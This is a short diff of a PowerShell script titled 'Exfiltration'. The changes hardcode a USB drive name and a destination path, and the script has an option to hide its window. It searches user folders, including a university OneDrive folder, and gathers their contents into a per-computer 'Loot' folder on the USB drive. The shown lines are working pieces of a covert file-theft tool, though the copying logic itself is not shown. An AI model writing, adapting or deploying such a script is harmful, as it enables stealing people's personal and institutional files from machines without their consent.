@@ -1,11 +1,11 @@
-[Console]::BackgroundColor = "Black"
+[Console]::BackgroundColor = "Black" 
 [Console]::SetWindowSize(57, 5)
 [Console]::Title = "Exfiltration"
 Clear-Host
 
 # Checking and getting the USB drive name if it is not provided
 if($driveName.length -lt 1){
-    $driveName = Read-Host "Enter the name of the USB drive "
+    $driveName = "Seagate_Storage"  # Changed to Seagate_Storage
 }
 
 # Checking if the window should be hidden
@@ -51,7 +51,7 @@ $foldersToSearch = @(
     "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
 )
 
-$destinationPath = "$driveLetter\$env:COMPUTERNAME-Loot"
+$destinationPath = "$driveLetter\Seagate_Storage\$env:COMPUTERNAME-Loot"  # Changed to Seagate_Storage
 
 # Ensure that the destination folder exists
 if (-not (Test-Path -Path $destinationPath)) {
